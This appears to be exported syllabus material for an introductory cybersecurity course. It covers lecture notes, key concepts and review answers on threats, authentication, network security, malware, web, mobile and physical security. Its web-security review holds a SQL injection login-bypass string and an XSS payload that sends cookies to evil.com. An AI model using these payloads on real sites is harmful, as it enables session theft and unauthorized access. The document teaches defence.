learning_objectives: Define cybersecurity and explain why it matters to every organization
Identify the major domains within cybersecurity as a profession
Describe the current state of cyber threats and the economic impact of breaches
Outline the structure and expectations of this course
readings: CompTIA Security+ Study Guide (Exam SY0-701) Ch. 1
NIST Cybersecurity Framework 2.0 Overview
Verizon 2025 Data Breach Investigations Report Executive Summary

lecture_notes.introduction: Welcome to Introduction to Cybersecurity, the gateway course for the Cybersecurity degree program. Cybersecurity is no longer an optional concern confined to IT departments; it is a board-level strategic priority for every organization on the planet. The global cost of cybercrime is projected to exceed ten trillion dollars annually, and the demand for qualified cybersecurity professionals continues to outpace supply by a factor of roughly three to one. In this opening session we survey the cybersecurity landscape from a broad perspective, examining why this field exists, who the key players are on both sides, and where the profession is headed. We will look at the domains defined by frameworks such as NICE and ISC2, consider the types of organizations that employ cybersecurity professionals, and discuss the career pathways that branch from this foundational course. By the end of the semester you will have a working vocabulary, a conceptual map of the field, and the prerequisite knowledge to advance into network security, operating systems security, and beyond.
key_concepts: Cybersecurity defined: protecting systems, networks, and data from digital attacks, unauthorized access, and damage
The cybersecurity talent gap: approximately 3.5 million unfilled positions worldwide as of 2025
Major cybersecurity domains: network security, application security, information security, operational security, disaster recovery, and end-user education
NICE Workforce Framework categories: Securely Provision, Operate and Maintain, Oversee and Govern, Protect and Defend, Analyze, Collect and Operate, Investigate
The evolving threat landscape: nation-state actors, organized crime, hacktivists, insider threats, and script kiddies
Economic impact: average cost of a data breach exceeds four million dollars globally
Regulatory drivers: GDPR, HIPAA, PCI-DSS, SOX, and their role in mandating security practices
Blue team vs red team vs purple team roles and how they interact
Key industry certifications: CompTIA Security+, CEH, CISSP, OSCP, and their career relevance
Course roadmap: from fundamentals through incident response to career preparation
lecture_notes.demonstration: Live walkthrough of the Verizon DBIR interactive dashboard showing breach statistics by industry, attack vector, and threat actor type, followed by a guided exploration of the NICE Workforce Framework interactive tool to map cybersecurity roles to required knowledge, skills, and abilities
setup_requirements: VirtualBox 7.0 or VMware Workstation Pro installed on student laptops
Kali Linux 2024.4 VM image downloaded and imported
Lab environment access credentials distributed via secure channel
Student accounts provisioned on the university cyber range platform

review.value: The practice of protecting systems, networks, programs, and data from digital attacks that aim to access, change, or destroy sensitive information, extort money, or interrupt normal business processes

The National Initiative for Cybersecurity Education Workforce Framework categorizes cybersecurity work into seven high-level categories, each containing specialty areas and work roles with defined KSAs

Nation-states pursue espionage and disruption with large budgets; organized crime seeks financial gain; hacktivists pursue ideological goals; insiders exploit trusted access; script kiddies use existing tools without deep understanding
Regulations such as GDPR, HIPAA, and PCI-DSS create legal obligations for security controls, and non-compliance can result in fines, lawsuits, and reputational damage

Entry-level roles include SOC analyst, junior penetration tester, and security administrator; mid-career roles include security engineer, incident responder, and threat intelligence analyst; senior roles include CISO, security architect, and principal consultant

class_schedule.topic: The CIA Triad and Security Principles
learning_objectives: Explain the CIA triad and apply it to evaluate the security posture of systems
Describe the AAA framework and its components
Define and apply the principles of least privilege, separation of duties, and defense in depth
Differentiate between vulnerabilities, threats, and risks
readings: CompTIA Security+ Study Guide Ch. 2
NIST SP 800-12 Rev. 1: An Introduction to Information Security
ISO 27001 Overview and Principles

lecture_notes.introduction: Every cybersecurity decision ultimately traces back to three fundamental properties: confidentiality, integrity, and availability, collectively known as the CIA triad. These three pillars form the conceptual foundation upon which the entire field of information security is built. Confidentiality ensures that information is accessible only to those authorized to see it. Integrity ensures that information has not been altered in an unauthorized manner. Availability ensures that information and systems are accessible when needed by authorized users. While the triad is simple to state, applying it correctly requires judgment, context, and an understanding of the risk environment. In this session we examine each pillar in depth, explore real-world scenarios where each has been violated, and learn the supporting principles that translate the triad into actionable security policies. We also introduce the Authentication, Authorization, and Accounting framework, which provides the mechanisms through which the CIA triad is enforced in practice. Understanding these foundational concepts is essential before we can meaningfully discuss threats, controls, or any specific security technology.
key_concepts: Confidentiality: preventing unauthorized disclosure of information through encryption, access controls, and data classification
Integrity: preventing unauthorized modification of data through hashing, digital signatures, checksums, and change management
Availability: ensuring systems and data are accessible when needed through redundancy, failover, load balancing, and disaster recovery
Authentication: verifying the identity of a user, device, or system through something you know, have, are, or somewhere you are
Authorization: determining what an authenticated entity is permitted to do through access control models and policies
Accounting: tracking and logging what authenticated entities actually do for audit trails and forensic analysis
Principle of least privilege: granting only the minimum permissions necessary to perform a task
Separation of duties: requiring multiple individuals to complete critical tasks to prevent fraud and errors
Defense in depth: layering multiple security controls so that if one fails, others continue to provide protection
Risk terminology: asset, vulnerability, threat, threat agent, exploit, risk, and the relationships between them
lecture_notes.demonstration: Case study analysis of the 2017 Equifax breach, mapping each failure to a specific CIA triad violation and identifying which security principles were not followed, followed by a hands-on exercise where students classify ten real-world security incidents by which CIA property was primarily violated
setup_requirements: Equifax breach timeline handout
CIA triad classification worksheet
Access to NIST National Vulnerability Database for CVE lookup

review.value: Confidentiality ensures data is accessible only to authorized parties; Integrity ensures data is not altered without authorization; Availability ensures systems are operational when needed. Every security control maps to one or more of these properties.

A layered security strategy where multiple independent controls protect the same asset. If the firewall is bypassed, the IDS detects the intrusion. If the IDS misses it, endpoint protection catches the malware. No single point of failure.

Users, processes, and systems should operate with the absolute minimum set of permissions required to accomplish their tasks. A database application should not run as root; a marketing employee should not have access to source code repositories.

Risk equals the likelihood of a threat exploiting a vulnerability multiplied by the impact to the organization. Risk management involves reducing likelihood through preventive controls and reducing impact through detective and corrective controls.

Authentication verifies identity, Authorization determines permissions, Accounting logs actions. Together they answer: who are you, what can you do, and what did you do. Implemented through protocols like RADIUS and TACACS+.

learning_objectives: Classify common types of cyber attacks by category and severity
Map attacks to the Lockheed Martin Cyber Kill Chain and MITRE ATT&CK framework
Differentiate between threat actors by motivation, capability, and resources
Analyze real-world attack campaigns using structured frameworks
readings: CompTIA Security+ Study Guide Ch. 3
Lockheed Martin Cyber Kill Chain whitepaper
MITRE ATT&CK Framework Getting Started Guide

lecture_notes.introduction: Understanding the threat landscape is the foundation of effective defense. You cannot protect what you do not understand, and you cannot defend against threats you cannot recognize. This session provides a structured approach to categorizing and analyzing cyber threats. We begin with the Lockheed Martin Cyber Kill Chain, a model that breaks down a typical intrusion into seven sequential phases from initial reconnaissance through final objective completion. We then examine the MITRE ATT&CK framework, which provides a far more granular taxonomy of adversary tactics, techniques, and procedures observed in real-world attacks. These frameworks are not academic exercises; they are actively used by security operations centers, threat intelligence teams, and incident responders worldwide to communicate about threats, prioritize defenses, and measure security effectiveness. We will apply both frameworks to real-world breach case studies, tracing the attack path from initial compromise to data exfiltration. By the end of this session, you will be able to read a threat intelligence report and map its findings to actionable defensive recommendations.
key_concepts: Cyber Kill Chain phases: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command and Control, Actions on Objectives
MITRE ATT&CK framework: 14 tactics from Initial Access through Impact, each containing dozens of specific techniques
Threat actor categories: nation-state APTs, cybercriminal organizations, hacktivists, insider threats, and opportunistic attackers
Attack vectors: phishing, drive-by downloads, supply chain compromise, credential stuffing, zero-day exploits, and physical access
Indicators of Compromise: IP addresses, domain names, file hashes, registry keys, and behavioral patterns that signal an intrusion
Threat intelligence sources: ISACs, OSINT feeds, commercial threat intel platforms, and government advisories from CISA
Advanced Persistent Threats: characteristics of long-duration, targeted campaigns by well-resourced adversaries
Attack surface management: identifying and minimizing the total number of points where an attacker could enter a system
Zero-day vulnerabilities versus known vulnerabilities and the economics of exploit markets
The role of vulnerability disclosure: responsible disclosure, bug bounties, and the CVE system
lecture_notes.demonstration: Interactive walkthrough of the MITRE ATT&CK Navigator tool, mapping the SolarWinds Sunburst attack to specific ATT&CK techniques across the kill chain, then generating a defensive gap analysis showing which techniques the organization can and cannot detect
setup_requirements: MITRE ATT&CK Navigator browser access
SolarWinds Sunburst attack timeline handout
Threat intelligence report samples from CISA advisories

review.value: Seven phases: Reconnaissance (gather intel), Weaponization (create exploit payload), Delivery (transmit to victim), Exploitation (trigger vulnerability), Installation (establish persistence), C2 (establish remote control), Actions on Objectives (achieve goal). Defenders can break the chain at any phase.

A knowledge base of adversary tactics and techniques based on real-world observations. Unlike the Kill Chain which is linear, ATT&CK represents a matrix of tactics that adversaries may use in any order. Used for threat modeling, detection engineering, and security assessment.

Observable artifacts on a system or network that indicate a potential intrusion. Atomic indicators include IP addresses and file hashes. Behavioral indicators include patterns like beaconing at regular intervals or lateral movement sequences.

Advanced: sophisticated custom tools and zero-day exploits. Persistent: maintain access for months or years. Threat: have both the intent and capability to cause significant harm. Typically nation-state sponsored with specific strategic objectives.

learning_objectives: Identify and classify social engineering attack techniques
Explain the psychological principles that make social engineering effective
Design organizational defenses against social engineering campaigns
Evaluate the effectiveness of security awareness training programs
readings: CompTIA Security+ Study Guide Ch. 4: Social Engineering
Kevin Mitnick: The Art of Deception Ch. 1-5
SANS Security Awareness Report 2025

lecture_notes.introduction: The most sophisticated firewall in the world cannot stop an employee from clicking a malicious link in a convincing email. Social engineering exploits the one vulnerability that can never be fully patched: human psychology. Social engineering attacks are consistently among the top initial access vectors in successful breaches, and their effectiveness has only increased with the advent of AI-generated content that makes phishing emails, voice calls, and even video nearly indistinguishable from legitimate communications. In this session we examine the major categories of social engineering attacks, from classic phishing and pretexting to modern techniques like deepfake audio and QR code phishing (quishing). More importantly, we explore the psychological principles that make these attacks work: authority, urgency, social proof, reciprocity, scarcity, and familiarity. Understanding why people fall for social engineering is the first step toward building effective defenses. We will examine both technical controls that reduce exposure and human-centered defenses like security awareness training, phishing simulations, and organizational culture change. The goal is not to blame users but to build systems and cultures that are resilient to manipulation.
key_concepts: Phishing: mass email campaigns using deceptive messages to steal credentials or deliver malware, including spear phishing, whaling, and clone phishing
Vishing and smishing: voice and SMS-based social engineering attacks exploiting trust in phone communications
Pretexting: creating a fabricated scenario to manipulate a target into providing information or performing actions
Baiting and quid pro quo: offering something enticing like a free USB drive or a service in exchange for access or information
Tailgating and piggybacking: following an authorized person through a physical access control without proper authentication
Psychological principles exploited: Cialdini's six principles of influence (reciprocity, commitment, social proof, authority, liking, scarcity)
Business Email Compromise: impersonating executives or vendors to redirect financial transactions, costing organizations billions annually
Deepfake threats: AI-generated voice and video used to impersonate trusted individuals in real-time communications
Security awareness training: designing effective programs that change behavior rather than just check compliance boxes
Technical controls: email authentication (SPF, DKIM, DMARC), anti-phishing gateways, URL rewriting, and browser isolation
lecture_notes.demonstration: Live analysis of five real phishing emails provided to the class, identifying the social engineering techniques, psychological triggers, and technical indicators in each, followed by a group exercise designing a phishing awareness campaign for a fictional company
setup_requirements: Sanitized phishing email samples for analysis
Email header analysis tools
GoPhish phishing simulation platform access for later labs

review.value: Phishing (mass), spear phishing (targeted individual), whaling (targeting executives), clone phishing (copying legitimate email), vishing (voice), smishing (SMS), quishing (QR code). Each variant exploits different trust relationships.

Authority: impersonating a boss or IT admin. Urgency: your account will be locked in 24 hours. Social proof: all your colleagues have already completed this. Scarcity: limited-time offer. These principles bypass rational decision-making.

BEC attacks caused over 2.7 billion dollars in losses in 2023 according to the FBI IC3. Attackers compromise or spoof executive email accounts and instruct finance departments to wire funds to attacker-controlled accounts.

SPF verifies the sending server is authorized for the domain. DKIM cryptographically signs email headers and body. DMARC ties SPF and DKIM together with a policy for handling failures. Together they significantly reduce email spoofing.

learning_objectives: Explain how password hashing and salting protect stored credentials
Compare authentication factors and multi-factor authentication approaches
Evaluate the security of various authentication protocols and standards
Design a secure authentication policy for an organization
readings: CompTIA Security+ Study Guide Ch. 5: Authentication and Access Control
NIST SP 800-63B: Digital Identity Guidelines - Authentication
OWASP Authentication Cheat Sheet

lecture_notes.introduction: Authentication is the gatekeeper of every digital system. It is the mechanism by which systems verify that users are who they claim to be, and it is one of the most frequently attacked components of any security architecture. Passwords remain the dominant authentication method despite decades of criticism, and understanding how they are attacked and defended is essential knowledge. In this session we trace the journey of a password from user input through hashing, salting, and storage, examining why techniques like bcrypt and Argon2 exist and what makes them superior to simple hash functions for credential storage. We then broaden our view to multi-factor authentication, examining the three classical factors of something you know, something you have, and something you are, along with modern additions like behavioral biometrics and context-based authentication. We examine real authentication protocols including RADIUS, LDAP, Kerberos, OAuth 2.0, and FIDO2/WebAuthn, understanding what problems each solves and where each is appropriate. The session concludes with a forward look at passwordless authentication and the push toward passkeys as a replacement for traditional credentials. The goal is to understand authentication deeply enough to both attack weak implementations in penetration testing and design strong implementations in security engineering.
key_concepts: Password attacks: brute force, dictionary attacks, credential stuffing, password spraying, rainbow tables, and pass-the-hash
Password hashing: one-way functions that convert passwords to fixed-length digests, making reversal computationally infeasible
Salting: prepending a unique random value to each password before hashing, defeating precomputed rainbow table attacks
Key stretching algorithms: bcrypt, scrypt, and Argon2 deliberately slow hashing to resist brute force and GPU-accelerated cracking
Authentication factors: knowledge (passwords, PINs), possession (tokens, smart cards, phones), inherence (fingerprints, iris, voice)
Multi-factor authentication: combining two or more independent factors to significantly increase authentication security
Kerberos: ticket-based authentication protocol used in Active Directory environments with KDC, TGTs, and service tickets
OAuth 2.0 and OpenID Connect: authorization and authentication frameworks for web and mobile applications
FIDO2 and WebAuthn: passwordless authentication using public key cryptography with hardware authenticators
Password policy best practices per NIST SP 800-63B: minimum length over complexity rules, no forced rotation, breached password screening
lecture_notes.demonstration: Hands-on demonstration of password cracking with Hashcat against a set of hashed passwords using dictionary, rule-based, and brute-force attacks, showing the dramatic difference in cracking time between MD5, SHA-256, bcrypt, and Argon2 hashed credentials at various password lengths and complexities
setup_requirements: Kali Linux VM with Hashcat and John the Ripper installed
Sample password hash files in multiple formats
RockYou wordlist and common rule sets
YubiKey or other FIDO2 authenticator for WebAuthn demonstration

review.value: Hashing is one-way and irreversible by design. Encryption is two-way and reversible with the key. Passwords should always be hashed, never encrypted, because there is no legitimate reason to recover the original password.

bcrypt uses a configurable work factor to make hashing deliberately slow. Argon2 adds memory-hardness, requiring significant RAM per hash computation, which defeats GPU-based parallel cracking. NIST recommends Argon2id for new applications.

MFA requires at least two independent factors from different categories. A password plus a security question is not MFA because both are knowledge factors. A password plus a phone-based TOTP code is MFA because it combines knowledge and possession.

Uses public key cryptography: the private key never leaves the authenticator device. Each registration creates a unique key pair per site, eliminating credential reuse. Phishing-resistant because the browser binds the credential to the origin domain.

NIST SP 800-63B recommends minimum 8-character passwords, checking against breached password lists, no complexity composition rules, no mandatory periodic rotation, and supporting passwords up to 64 characters. This reverses decades of traditional password policy.

learning_objectives: Identify common network security devices and explain their functions
Differentiate between stateless, stateful, and next-generation firewalls
Explain the roles of IDS, IPS, and network monitoring in a security architecture
Design a basic network security architecture with segmentation and defense in depth
readings: CompTIA Security+ Study Guide Ch. 6: Network Security
Cisco Network Security Fundamentals Guide
NIST SP 800-41: Guidelines on Firewalls and Firewall Policy

lecture_notes.introduction: Networks are the highways of digital communication, and securing them is one of the most critical tasks in cybersecurity. Every piece of data that moves between systems traverses a network, and attackers who control the network can intercept, modify, or disrupt virtually any communication. Network security encompasses the policies, practices, and technologies designed to protect the integrity, confidentiality, and availability of network infrastructure and data in transit. In this session we examine the primary network security devices and technologies that form the backbone of any defensive architecture. We start with firewalls, tracing their evolution from simple packet filters through stateful inspection to modern next-generation firewalls that perform deep packet inspection, application awareness, and integrated threat intelligence. We then examine intrusion detection and prevention systems, which monitor network traffic for signs of malicious activity. We discuss network segmentation strategies including VLANs, DMZs, and micro-segmentation, which limit the blast radius of a successful breach. Finally, we look at VPN technologies that protect data in transit across untrusted networks. The overarching theme is defense in depth: no single device or technology is sufficient, but layered together they create a formidable barrier.
key_concepts: Firewalls: packet filtering (stateless), stateful inspection, application-layer (proxy), and next-generation with deep packet inspection
Intrusion Detection Systems: network-based (NIDS) and host-based (HIDS), signature-based and anomaly-based detection methods
Intrusion Prevention Systems: inline deployment that actively blocks detected threats versus IDS passive monitoring and alerting
Network segmentation: dividing networks into isolated zones using VLANs, subnets, and firewall rules to contain breaches
DMZ architecture: placing public-facing servers in a demilitarized zone between the external and internal networks
VPN technologies: IPSec tunnel and transport modes, SSL/TLS VPNs, WireGuard, and split versus full tunneling
Network Access Control: 802.1X port-based authentication ensuring only authorized devices connect to the network
Zero Trust Network Architecture: never trust, always verify, regardless of network location
DNS security: DNSSEC, DNS over HTTPS, DNS filtering, and sinkholing for malware domain blocking
Network monitoring: NetFlow, packet capture, and traffic analysis for baseline establishment and anomaly detection
lecture_notes.demonstration: Configuring iptables rules on a Linux firewall to create a basic DMZ architecture, then using Wireshark to observe how the firewall handles allowed and blocked traffic, followed by enabling Snort IDS rules and observing alert generation for simulated attack traffic
setup_requirements: Wireshark installed on student VMs
Linux VM with iptables for firewall configuration
Snort IDS installed and configured with community rules
Network lab topology with internal, DMZ, and external segments

review.value: Stateless firewalls examine each packet independently against rules (ACLs). Stateful firewalls track active connections in a state table, allowing return traffic for established connections and detecting out-of-state packets that may indicate attacks.

IDS monitors traffic passively and generates alerts for suspicious activity. IPS sits inline and actively blocks malicious traffic. IDS can see but not stop attacks; IPS can stop attacks but may cause false-positive disruptions to legitimate traffic.

A DMZ creates a buffer zone between the internet and internal network. Public servers like web and email servers sit in the DMZ. Two firewalls or a dual-homed firewall controls traffic: internet-to-DMZ (restricted), DMZ-to-internal (highly restricted), internal-to-DMZ (moderately open).

Traditional perimeter security assumes internal traffic is trusted. Zero Trust assumes all traffic is potentially hostile. Every access request is authenticated, authorized, and encrypted regardless of origin. Microsegmentation enforces this at a granular level.

learning_objectives: Classify malware by type, behavior, and propagation mechanism
Explain how antivirus and endpoint detection and response tools identify malware
Analyze malware behavior using static and dynamic analysis techniques
Design layered defenses against common malware threats
readings: CompTIA Security+ Study Guide Ch. 7: Malware and Threats
Practical Malware Analysis Ch. 1: Basic Static and Dynamic Techniques
MITRE ATT&CK Malware Techniques Overview

lecture_notes.introduction: Malware, short for malicious software, is the primary weapon in the arsenal of most cyber attackers. From the earliest computer viruses in the 1980s to today's sophisticated ransomware-as-a-service operations, malware has evolved into a multi-billion dollar criminal industry with its own supply chains, marketplaces, and support services. Understanding malware is not just about memorizing categories; it is about understanding the lifecycle of malicious code from creation through delivery, execution, persistence, and impact. In this session we examine the major categories of malware including viruses, worms, trojans, ransomware, spyware, rootkits, and fileless malware, focusing on how each type propagates, executes, and achieves its objectives. We then turn to defense, examining how antivirus software has evolved from simple signature matching to advanced endpoint detection and response platforms that use behavioral analysis, machine learning, and threat intelligence to identify both known and unknown threats. We discuss the concept of defense in depth applied specifically to malware, layering email filtering, web proxies, network monitoring, endpoint protection, and application whitelisting to create multiple barriers that malware must defeat to achieve its objectives.
key_concepts: Viruses: self-replicating code that attaches to host programs and requires user action to propagate
Worms: self-propagating malware that spreads across networks without user interaction by exploiting vulnerabilities
Trojans: malware disguised as legitimate software that provides unauthorized access or performs malicious actions
Ransomware: malware that encrypts victim files and demands payment for decryption keys, increasingly using double extortion with data theft
Rootkits: malware that modifies the operating system to hide its presence, operating at kernel or firmware level
Fileless malware: attacks that operate entirely in memory using legitimate system tools like PowerShell and WMI, leaving no files on disk
Spyware and keyloggers: software that covertly monitors user activity, captures keystrokes, screenshots, and sensitive data
Signature-based detection: matching file hashes or byte patterns against a database of known malware signatures
Behavioral analysis and heuristic detection: identifying malware by its actions rather than its code patterns
Endpoint Detection and Response: continuous monitoring of endpoint activity with automated threat detection, investigation, and response capabilities
lecture_notes.demonstration: Safe analysis of a defanged ransomware sample in an isolated sandbox: examining the binary with static analysis tools to identify strings and imports, then executing it in a monitored sandbox to observe file encryption behavior, registry modifications, and network communication attempts
setup_requirements: Isolated malware analysis VM with no network connectivity to production
REMnux Linux distribution for static analysis tools
ANY.RUN or Joe Sandbox cloud account for dynamic analysis
Defanged malware samples from MalwareBazaar

review.value: Modern ransomware uses double extortion: encrypt files AND exfiltrate data, threatening to publish if ransom is not paid. Ransomware-as-a-Service provides tools to affiliates for a percentage of profits. Average ransom payment exceeds 500,000 dollars.

Operates in memory using legitimate tools (PowerShell, WMI, .NET). Never writes malicious files to disk, evading traditional antivirus. Detection requires behavioral monitoring, memory forensics, and logging of script execution.

Traditional AV relies primarily on signatures. EDR provides continuous monitoring, behavioral detection, automated response, threat hunting, and forensic investigation capabilities. EDR sees the full attack chain, not just individual file signatures.

Layer 1: email gateway filters malicious attachments. Layer 2: web proxy blocks malicious URLs. Layer 3: NGFW inspects network traffic. Layer 4: EDR monitors endpoint behavior. Layer 5: application whitelisting prevents unauthorized execution. Each layer catches what others miss.

learning_objectives: Identify the OWASP Top 10 web application vulnerabilities
Explain how injection attacks, XSS, and CSRF work at the protocol level
Describe web application security controls including WAFs and secure coding practices
Evaluate the security of a web application using structured assessment methods
readings: CompTIA Security+ Study Guide Ch. 8: Web Application Security
OWASP Top 10 2021 Document
OWASP Web Security Testing Guide: Introduction

lecture_notes.introduction: Web applications are the primary interface between organizations and their customers, making them the most exposed and most attacked surface in most environments. The OWASP Top 10 represents the most critical security risks to web applications, and understanding these vulnerabilities is essential for anyone in cybersecurity, whether you are on the defensive side securing applications or the offensive side testing them. In this session we examine the most dangerous web application vulnerabilities in depth, starting with injection attacks where untrusted data is sent to an interpreter as part of a command or query. We examine cross-site scripting where malicious scripts are injected into content viewed by other users, and cross-site request forgery where authenticated users are tricked into performing unintended actions. We discuss broken authentication, sensitive data exposure, security misconfiguration, and insecure deserialization, providing concrete examples and code-level explanations for each vulnerability. On the defensive side, we examine web application firewalls, secure development lifecycle practices, input validation, output encoding, parameterized queries, and content security policies. The session provides a foundation for understanding application security that will be expanded in later courses.
key_concepts: SQL injection: inserting malicious SQL into input fields to manipulate database queries, extract data, or bypass authentication
Cross-Site Scripting (XSS): reflected, stored, and DOM-based injection of malicious JavaScript into web pages viewed by other users
Cross-Site Request Forgery (CSRF): forcing authenticated users to submit requests they did not intend via malicious websites or emails
Broken authentication: session fixation, credential stuffing, weak session management, and insecure password recovery mechanisms
Security misconfiguration: default credentials, unnecessary features enabled, missing security headers, verbose error messages
Server-Side Request Forgery (SSRF): manipulating server-side requests to access internal resources or cloud metadata services
Web Application Firewalls: inspecting HTTP traffic for malicious patterns and blocking attack payloads before they reach the application
Content Security Policy: browser-enforced policy that restricts script sources, mitigating XSS by preventing inline script execution
HTTPS and TLS: encrypting web traffic to protect confidentiality and integrity, certificate management and pinning
Secure development practices: input validation, output encoding, parameterized queries, least privilege database accounts
lecture_notes.demonstration: Using OWASP WebGoat to demonstrate SQL injection and XSS attacks step by step, showing how unparameterized queries lead to data extraction, then demonstrating the same application with proper input validation and parameterized queries to show the defense
setup_requirements: OWASP WebGoat application running on student VMs
Burp Suite Community Edition for request interception and manipulation
Browser developer tools for inspecting web traffic
OWASP ZAP for automated vulnerability scanning

review.value: Attacker inputs: ' OR '1'='1' -- into a login form. If the query is SELECT * FROM users WHERE user='' OR '1'='1' -- AND pass='', the OR condition is always true, bypassing authentication. Defense: parameterized queries that separate code from data.

Attacker injects <script>document.location='http://evil.com/?c='+document.cookie</script> into a comment field. When other users view the page, their cookies are sent to the attacker. Defense: output encoding and Content Security Policy.
Victim is logged into their bank. Attacker sends an email with an image tag: . The browser sends the request with the victim's session cookie. Defense: anti-CSRF tokens and SameSite cookie attribute.

WAFs provide an important layer of defense but cannot replace secure coding. They can be bypassed with encoding tricks, polymorphic payloads, and zero-day attack patterns. WAFs are a safety net, not a substitute for fixing vulnerabilities.

learning_objectives: Identify security challenges unique to mobile devices and IoT
Compare mobile security models of iOS and Android platforms
Evaluate mobile device management and enterprise mobility strategies
Assess IoT security risks and mitigation strategies
readings: CompTIA Security+ Study Guide Ch. 9: Mobile and Embedded Device Security
OWASP Mobile Security Testing Guide: Chapters 1-3
NIST SP 800-183: Networks of Things

lecture_notes.introduction: The proliferation of mobile devices and Internet of Things sensors has dramatically expanded the attack surface of modern organizations. Employees carry powerful computers in their pockets that contain corporate email, VPN credentials, and access to cloud services. Meanwhile, billions of IoT devices from industrial sensors to smart thermostats connect to networks with minimal security capabilities. Mobile devices present unique challenges because they operate in hostile environments: connecting to untrusted Wi-Fi networks, running third-party applications, and being physically lost or stolen with alarming frequency. The security models of iOS and Android take fundamentally different approaches to sandboxing, permission management, and app distribution, and understanding these differences is essential for making informed security decisions. IoT devices compound these challenges with limited computational resources that cannot run traditional security software, long deployment lifetimes that exceed vendor support periods, and default configurations that prioritize convenience over security. In this session we examine the threat landscape, platform security architectures, and defensive strategies for both mobile and IoT environments.
key_concepts: Mobile threat landscape: malicious apps, network-based attacks, device theft, jailbreaking and rooting, phishing optimized for small screens
iOS security model: hardware root of trust, Secure Enclave, mandatory code signing, App Store review, sandboxing, and data protection classes
Android security model: application sandboxing via Linux permissions, SELinux enforcement, Google Play Protect, and verified boot
Mobile Device Management: remote wipe, policy enforcement, application management, containerization of corporate data, and compliance checking
Bring Your Own Device: security challenges of personal devices accessing corporate resources, and policy frameworks for balancing security with usability
IoT security challenges: limited compute resources, default credentials, lack of encryption, insecure update mechanisms, and long deployment lifetimes
IoT attack vectors: Mirai botnet-style default credential exploitation, firmware extraction and reverse engineering, side-channel attacks
IoT network segmentation: isolating IoT devices on dedicated VLANs with strict firewall rules limiting communication to required endpoints only
Mobile application security: certificate pinning, secure local storage, biometric authentication APIs, and runtime application self-protection
Regulatory considerations: GDPR implications for mobile data collection, California IoT security law requirements for default credential changes
lecture_notes.demonstration: Demonstration of Android application analysis using JADX to decompile an APK and identify hardcoded API keys and insecure data storage, followed by network traffic analysis of IoT devices on the lab network revealing unencrypted telemetry data and default management credentials
setup_requirements: Android emulator with sample applications
JADX decompiler for APK analysis
IoT lab devices: smart plugs, IP cameras with default configurations
Wireshark for IoT traffic capture and analysis

review.value: iOS uses a closed ecosystem with mandatory App Store review and hardware-backed Secure Enclave. Android is more open with sideloading capability and varied vendor implementations. Both sandbox applications but iOS enforces stricter inter-app isolation.

Mobile Device Management enables remote wipe of lost devices, enforcement of passcode policies, control of which apps can be installed, containerization separating personal and corporate data, and VPN configuration pushing. Essential for enterprise mobile security.

Mirai infected 600,000+ IoT devices using a table of 62 default username/password combinations. The resulting botnet launched DDoS attacks exceeding 1 Tbps. Defense requires changing defaults, network segmentation, and monitoring for anomalous traffic patterns.

BYOD policies must define acceptable use, required security controls (encryption, passcode, MDM enrollment), data ownership and wiping procedures upon departure, and acceptable applications. Balance security requirements with employee privacy expectations.

learning_objectives: Identify physical security threats to information systems and data
Explain the layers of physical security controls from perimeter to rack
Design a physical security program that integrates with logical security controls
Evaluate environmental controls for data center protection
readings: CompTIA Security+ Study Guide Ch. 10: Physical Security
NIST SP 800-116: Recommendation for the Use of PIV Credentials in Physical Access Control
Data Center Physical Security Best Practices (Uptime Institute)

lecture_notes.introduction: Physical security is the foundation upon which all other security controls rest. The most sophisticated encryption and access controls are meaningless if an attacker can walk into a server room and plug in a USB device, steal a hard drive, or physically destroy equipment. Physical security encompasses the design and implementation of measures to protect personnel, hardware, software, networks, and data from physical actions and events that could cause serious loss or damage. This includes protection against natural disasters, environmental hazards, theft, vandalism, and unauthorized physical access. In this session we examine physical security through a layered defense model, starting from the perimeter of a facility and working inward to the server rack. We discuss site selection considerations, perimeter security including fences, gates, and bollards, building access controls including mantraps, badge readers, and biometric systems, interior monitoring with cameras and motion sensors, and data center environmental controls including fire suppression, HVAC, and power protection. We also examine how physical security integrates with logical security: physical access control systems that tie into identity management, environmental monitoring systems that feed into SIEM platforms, and visitor management systems that maintain audit trails.
key_concepts: Perimeter security: fences, gates, bollards, vehicle barriers, lighting, and landscaping designed to deter and delay physical intrusion
Access control vestibules (mantraps): interlocking door systems that prevent tailgating by requiring authentication between two doors
Badge systems and smart cards: proximity cards, smart cards, and PIV credentials for physical access with audit trail logging
Biometric access controls: fingerprint, iris, facial recognition, and palm vein readers for high-security areas
Video surveillance: CCTV placement, recording retention policies, analytics for anomaly detection, and integration with access control events
Environmental controls: HVAC for temperature and humidity management, hot and cold aisle containment, and monitoring systems
Fire suppression: wet pipe, dry pipe, pre-action sprinkler systems, and clean agent suppression (FM-200) for data centers
Power protection: UPS systems for short-term power conditioning, diesel generators for extended outages, and dual power feed redundancy
Data destruction: degaussing, physical shredding, and secure wiping standards (NIST SP 800-88) for storage media sanitization
Social engineering and physical penetration testing: testing physical security controls through authorized simulation of unauthorized access attempts
lecture_notes.demonstration: Virtual tour of a Tier III data center design with narrated walkthrough of each physical security layer from the perimeter fence through the mantrap, into the raised floor data center, showing camera placement, environmental controls, and rack-level physical security measures
setup_requirements: Data center design diagrams and blueprints
Physical security audit checklist
NIST SP 800-88 media sanitization reference
Lock picking practice kits for physical security awareness

review.value: Layer 1: Perimeter (fences, gates, lighting). Layer 2: Building exterior (doors, windows, locks). Layer 3: Interior (badge readers, cameras, mantraps). Layer 4: Server room (biometrics, environmental controls). Layer 5: Rack (cable locks, locked cabinets). Each layer adds delay and detection.

A vestibule with two interlocking doors where only one can be open at a time. The person must authenticate between the doors. Weight sensors detect piggybacking. Essential for high-security areas to prevent tailgating attacks.

FM-200 and Novec 1230 suppress fires by absorbing heat without leaving residue or damaging electronics, unlike water sprinklers. Required for data centers where water damage to servers would be as catastrophic as fire damage.

NIST SP 800-88 defines three levels: Clear (overwrite), Purge (degauss or cryptographic erase), and Destroy (physical shredding). The appropriate level depends on data classification and whether the media will be reused or disposed of.

learning_objectives: Distinguish between data privacy and data security concepts
Explain major privacy regulations and their requirements for organizations
Implement data classification schemes and data handling procedures
Design data protection strategies including encryption, masking, and anonymization
readings: CompTIA Security+ Study Guide Ch. 11: Data Privacy and Protection
GDPR Articles 1-25 (Summary)
NIST Privacy Framework Overview

